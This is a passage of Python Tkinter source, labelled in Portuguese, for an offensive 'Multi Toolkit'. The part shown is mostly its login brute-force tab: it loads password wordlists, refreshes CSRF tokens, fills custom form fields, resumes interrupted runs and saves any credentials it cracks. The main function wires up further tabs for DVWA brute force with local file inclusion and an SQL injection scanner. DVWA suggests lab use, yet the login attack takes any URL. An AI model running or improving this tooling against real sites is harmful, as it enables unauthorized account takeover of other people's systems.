        ttk.Entry(linha2, textvariable=self.man_pass_var, width=14).pack(side="left", padx=4)
        ttk.Label(linha2, text="Token CSRF:").pack(side="left")
        self.man_token_var = tk.StringVar(value="_token")
        ttk.Entry(linha2, textvariable=self.man_token_var, width=20).pack(side="left", padx=4)

        linha3 = ttk.Frame(frm_man)
        linha3.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha3, text="Campos extras:").pack(side="left")
        self.man_extra_var = tk.StringVar()
        ttk.Entry(linha3, textvariable=self.man_extra_var, width=52).pack(side="left", padx=4)
        ttk.Label(linha3, text="ex.: login-button=Login;redirect_to=/").pack(side="left")

        # ---------------------------------------------------- botoes
        botoes = ttk.Frame(self)
        botoes.pack(fill="x", padx=4, pady=4)
        self.btn_start = ttk.Button(botoes, text=">> Iniciar Ataque <<", command=self.start)
        self.btn_start.pack(side="left", padx=5)
        self.btn_stop = ttk.Button(botoes, text="[] Parar", command=self.stop,
                                   state="disabled")
        self.btn_stop.pack(side="left", padx=5)
        # Salva somente as 2 linhas do resultado (sem salvamento automático)
        self.btn_save = ttk.Button(botoes, text="[ Salvar Senha ]", command=self.salvar_senha)
        self.btn_save.pack(side="left", padx=5)

        self.progress_var = tk.DoubleVar(value=0)
        ttk.Progressbar(self, variable=self.progress_var, maximum=100).pack(
            fill="x", padx=4, pady=4)
        self.status_var = tk.StringVar(value="Pronto. Escolha um caminho comum ou digite a URL.")
        ttk.Label(self, textvariable=self.status_var).pack(anchor="w", padx=8)

        log_frame = ttk.LabelFrame(self, text=" Saída ", padding=5)
        log_frame.pack(fill="both", expand=True, padx=4, pady=6)
        self.log_area = make_log(log_frame)
        self.log_area.pack(fill="both", expand=True)

    # -------------------------------------------------- utilitários GUI
    def aplicar_caminho(self, _event=None):
        """Junta host:porta da URL atual com o caminho selecionado."""
        url = self.url_var.get().strip().rstrip("/")
        caminho = self.path_var.get().strip()
        if not caminho:
            return
        if not url:
            self.url_var.set(caminho)
            return
        m = re.match(r"^(https?://[^/]+)", url)
        if m:
            self.url_var.set(m.group(1) + caminho)

    def aplicar_preset(self, _event=None):
        """Aplica um preset do modo manual (URL, action, campos e extras)."""
        preset = PRESETS.get(self.preset_var.get())
        if not preset:
            return
        url = self.url_var.get().strip().rstrip("/")
        m = re.match(r"^(https?://[^/]+)", url)
        base = m.group(1) if m else ""
        self.url_var.set(base + preset["path"])
        self.man_action_var.set(base + preset["action"])
        self.man_user_var.set(preset["user"])
        self.man_pass_var.set(preset["pass"])
        self.man_token_var.set(preset["token"])
        self.man_method_var.set(preset["method"].upper())
        self.man_extra_var.set(preset.get("extra", ""))

    def browse(self):
        path = filedialog.askopenfilename(
            title="Selecione a wordlist",
            filetypes=[("Arquivos de texto", "*.txt"), ("Todos", "*.*")])
        if path:
            self.wordlist_var.set(path)

    def salvar_senha(self):
        """Grava SOMENTE as 2 linhas do resultado."""
        if not self.senha_encontrada:
            messagebox.showinfo("Salvar Senha",
                                "Nenhuma senha encontrada até agora.\n"
                                "Execute o ataque e aguarde o resultado [+].")
            return
        usuario, senha = self.senha_encontrada
        texto = (f"[+] SENHA ENCONTRADA: {senha}\n"
                 f"\n[+] Credenciais \n\nUSUARIO: {usuario} \n\nSENHA: {senha}\n")
        agora = time.strftime("Data  %d_%m_%Y   Hora %H_%M_%S")
        path = filedialog.asksaveasfilename(
            title="Salvar senha encontrada",
            defaultextension=".txt",
            initialfile=f"senha_{agora}.txt",
            filetypes=[("Arquivos de texto", "*.txt"), ("Todos", "*.*")])
        if not path:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(texto)
            messagebox.showinfo("Salvar Senha", f"Senha salva:\n{path}")
        except Exception as e:
            messagebox.showerror("Salvar Senha", f"Falha ao salvar:\n{e}")

    # ---------------------------------------------- ponte thread -> GUI
    def log(self, msg):
        self.queue.put(("log", msg))

    def progress(self, i, total, pwd=""):
        # i é 1-based; a PRÓXIMA senha (0-based) a testar é exatamente i
        self.proximo_indice = i
        self.queue.put(("progress", (i, total, pwd)))

    def done(self, msg):
        self.queue.put(("done", msg))

    def on_resultado(self, usuario, senha):
        self.queue.put(("resultado", (usuario, senha)))

    def _poll_queue(self):
        try:
            while True:
                kind, payload = self.queue.get_nowait()
                if kind == "log":
                    log_insert(self.log_area, payload)
                elif kind == "progress":
                    i, total, pwd = payload
                    pct = (i / total) * 100 if total else 0
                    self.progress_var.set(pct)
                    self.status_var.set(f"[{i}/{total}] ({pct:.1f}%) Testando:   {pwd}")
                elif kind == "resultado":
                    self.senha_encontrada = payload
                    usuario, senha = payload
                    self.status_var.set(f"[+] Senha encontrada: {usuario} : {senha} | "
                                        f"Clique em Salvar Senha")
                elif kind == "done":
                    self.btn_start.configure(state="normal")
                    self.btn_stop.configure(state="disabled")
                    if not self.senha_encontrada:
                        self.status_var.set(payload)
        except queue.Empty:
            pass
        self.after(100, self._poll_queue)

    # ---------------------------------------------------------- ataque
    def start(self):
        # Se o ataque anterior ainda está terminando, espera ele morrer
        # de verdade antes de começar (evita resetar o índice por corrida).
        if self.worker is not None and self.worker.is_alive():
            self.status_var.set("Aguardando o ataque anterior parar completamente...")
            self.after(250, self.start)
            return

        url = self.url_var.get().strip()
        user = self.user_var.get().strip()
        wl_path = self.wordlist_var.get().strip()
        verbose = self.verbose_var.get()
        renovar = self.token_var.get()
        delay = self.delay_var.get()

        if not url or not user:
            messagebox.showerror("Erro", "Informe a URL e o usuário.")
            return
        if wl_path:
            if not os.path.isfile(wl_path):
                messagebox.showerror("Erro", f"Arquivo não encontrado:\n{wl_path}")
                return
            try:
                with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                    passwords = [linha.strip() for linha in f if linha.strip()]
            except Exception as e:
                messagebox.showerror("Erro", f"Falha ao ler wordlist:\n{e}")
                return
            if not passwords:
                messagebox.showerror("Erro", "Wordlist vazia.")
                return
        else:
            passwords = DEFAULT_WORDLIST[:]

        # --- modo manual (SPA / campos extras) ---
        manual = None
        if self.manual_var.get():
            action = self.man_action_var.get().strip()
            user_field = self.man_user_var.get().strip()
            pass_field = self.man_pass_var.get().strip()
            token_field = self.man_token_var.get().strip()
            method = self.man_method_var.get().strip().lower() or "post"
            if not (action and user_field and pass_field):
                messagebox.showerror(
                    "Erro", "Modo manual: preencha Action, campo usuário e campo senha.")
                return
            manual = {
                "action": action,
                "method": method,
                "user_field": user_field,
                "pass_field": pass_field,
                "token_field": token_field or None,
                "extra": parse_campos_extras(self.man_extra_var.get()),
            }

        # --- retomada: continua de onde parou, se a wordlist não mudou ---
        wl_fonte = wl_path if wl_path else "builtin"
        if self.fonte_wordlist and self.fonte_wordlist != wl_fonte:
            self.proximo_indice = 0
            self.log("[*] Wordlist alterada -> recomeçando do início.")
        self.fonte_wordlist = wl_fonte

        inicio = 0
        if self.proximo_indice > 0:
            if self.proximo_indice >= len(passwords):
                self.proximo_indice = 0
                self.log("[*] Ataque anterior chegou ao fim da lista -> recomeçando do início.")
            else:
                inicio = self.proximo_indice

        resumindo = inicio > 0

        if not resumindo and not wl_path:
            self.log("[*] Nenhuma wordlist selecionada -> lista embutida de demonstração.")

        self.stop_event.clear()
        self.senha_encontrada = None
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.progress_var.set((inicio / len(passwords)) * 100 if passwords else 0)
        self.log_area.configure(state="normal")
        if not resumindo:                       # na retomada, MANTÉM o histórico
            self.log_area.delete("1.0", "end")
        self.log_area.configure(state="disabled")

        engine = BruteForceLogin(url, user, passwords, self.log, self.progress,
                                 self.stop_event, self.on_resultado,
                                 verbose=verbose, renovar_token=renovar,
                                 delay=delay, inicio=inicio, manual=manual)
        self.worker = threading.Thread(target=self._run_engine, args=(engine,),
                                       daemon=True)
        self.worker.start()

    def _run_engine(self, engine):
        try:
            engine.run()
        except Exception as e:
            self.log(f"[!] Erro inesperado: {type(e).__name__}: {e}")
        finally:
            if engine.found:
                self.proximo_indice = 0
                self.done("Ataque finalizado. Senha encontrada (veja o log) — use 'Salvar Senha'.")
            elif self.parado_pelo_usuario:
                # usuário clicou em Parar -> MANTÉM o índice p/ retomar
                self.done("Ataque interrompido. Clique em 'Iniciar Ataque' para continuar de onde parou.")
            else:
                self.proximo_indice = 0
                self.done("Ataque finalizado. Nenhuma senha válida nas tentativas.")
            self.parado_pelo_usuario = False

    def stop(self):
        self.stop_event.set()
        self.parado_pelo_usuario = True
        self.status_var.set("Parando... aguarde a tentativa atual terminar.")


# ####################################################################
# MAIN
# ####################################################################
def main():
    root = tk.Tk()
    root.title("Multi Toolkit  ::  DVWA BF/LFI + SQLi Scanner + Login BF")
    root.geometry("1150x860")
    root.minsize(900, 640)
    apply_theme(root)

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True, padx=8, pady=8)

    tab1 = DvwaTab(notebook)
    tab2 = SqliTab(notebook)
    tab3 = LoginTab(notebook)

    notebook.add(tab1, text="  DVWA Brute Force + LFI  ")
    notebook.add(tab2, text="  SQLi Scanner  ")
    notebook.add(tab3, text="  Login Brute Force  ")

    root.mainloop()


if __name__ == "__main__":
    main()
